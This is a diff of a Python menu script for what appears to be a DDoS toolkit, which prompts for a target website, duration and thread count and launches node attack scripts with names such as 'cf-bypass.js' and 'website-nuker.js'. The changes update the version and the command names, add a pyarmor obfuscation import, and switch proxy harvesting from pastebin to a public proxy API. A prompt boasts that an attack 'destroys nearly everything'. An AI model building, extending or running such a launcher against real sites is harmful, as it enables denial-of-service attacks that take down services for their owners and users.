@@ -2,6 +2,7 @@
 # usr/env/bin/python3.6
 import colorama
 import sys
+import pyarmor
 import os
 import getpass
 from datetime import date
@@ -12,7 +13,7 @@ import requests as r
 os.system('chmod +x menu.py')
 os.system('clear')
 
-version = "2.0"
+version = "3.0"
 pcnaam = "z3ntl3"
 indicatorlogo = f"\033[0m\033[36m┌──\033[36m(\033[31mroot\033[0m💀\033[31mroot\033[36m)-[\033[0m\033[39m\033[1m/home/z3ntl3\033[0m\033[36m]\n\033[36m└─\033[31m#\033[96m "
 
@@ -151,7 +152,7 @@ while True:
         time = input("\033[31m>>> \033[39mTime \033[31m:\033[36m\033[31m")
         threads = input("\033[31m>>> \033[39mThreads \033[31m:\033[36m\033[31m")
         connections = input("\033[31m>>> \033[39mConnection \033[31m:\033[36m\033[31m")
-        cfbypassrunattack = ("nodejs cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxy.txt" + " " + connections)
+        cfbypassrunattack = ("node cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxies.txt" + " " + connections)
         os.system(cfbypassrunattack)
     if kies == "http-vip":
         os.system('clear')
@@ -174,7 +175,7 @@ while True:
     """)
         websitenukerwebsite = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
         timewebsitenuker = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
-        sendattackwebsitenuker = ("nodejs website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
+        sendattackwebsitenuker = ("node website-nuker.js " + websitenukerwebsite + " " + timewebsitenuker)
         os.system(sendattackwebsitenuker)
     if kies == "website-nuker-http":
         os.system('clear')
@@ -186,7 +187,7 @@ while True:
     """)
         websitenukerwebsitehttp = input("\033[31m>>> \033[39mWebsite \033[31m:\033[36m\033[31m")
         timewebsitenukerhttp = input("\033[31m>>> \033[39mTime\033[31m:\033[36m\033[31m")
-        sendattackwebsitenukerhttp = ("nodejs website-nuker-http.js " + websitenukerwebsitehttp + " " + timewebsitenukerhttp)
+        sendattackwebsitenukerhttp = ("node website-nuker-http.js " + websitenukerwebsitehttp + " " + timewebsitenukerhttp)
         os.system(sendattackwebsitenukerhttp)
     if kies == "https-root":
         os.system('chmod +x https-root')
@@ -212,7 +213,7 @@ while True:
     	ultrabypasswebsite = input("\033[31m>>> \033[39mWEBSITE \033[31m:\033[36m\033[31m")
     	ultrabypasstime = input("\033[31m>>> \033[39mTIME(seconds) \033[31m:\033[36m\033[31m")
     	couldbeslow = input("\033[31m>>> \033[39mAttack could be slow. But when it starts hitting it destroys nearly everything!\033[31m:\033[36m\033[31m")
-    	sendultrabypassattack = ("nodejs method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request 5")
+    	sendultrabypassattack = ("node method.js " + ultrabypasswebsite + " " + ultrabypasstime + " request 5")
     	os.system(sendultrabypassattack	)
     if kies == "homeholder":
         os.system('clear')
@@ -233,15 +234,17 @@ while True:
         print("""
 \033[36m[\033[39mTOOLS.x\033[36m]\033[0m
 
-\033[31m>>> \033[39mproxy-crawl \033[31m: \033[36m crawl-proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
+\033[31m>>> \033[39mproxy-crawl \033[31m: \033[36m crawl proxies\033[31m[\033[32mRUNNING\033[31m]\033[0m
     """)
         os.system('sudo rm proxies.txt')
-        os.system('wget https://pastebin.com/raw/wHB9WaeC')
-        os.system('sudo mv wHB9WaeC proxies.txt')
-        amount = r.get("https://pastebin.com/raw/yrZakbWY")
-        z3ntl3rootXX = (amount.text)
-        print(str("Proxies last updated on: " + z3ntl3rootXX))
-        gobackMENU = input(indicatorlogo + '\n--> Go back menu (y/n):')
+        crawlPROXYHTTP =  r.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=7000")
+        textPROXIES = (crawlPROXYHTTP.text)
+        with open('proxies.txt', 'x') as file:
+        
+            file.write(str(textPROXIES))
+            file.write('\n')
+        print(indicatorlogo + "Proxies saved in = proxies.txt\n\n")
+        gobackMENU = input( indicatorlogo + "Go back to menu (y/n):")
         if gobackMENU == "n":
             sys.exit()
         else:
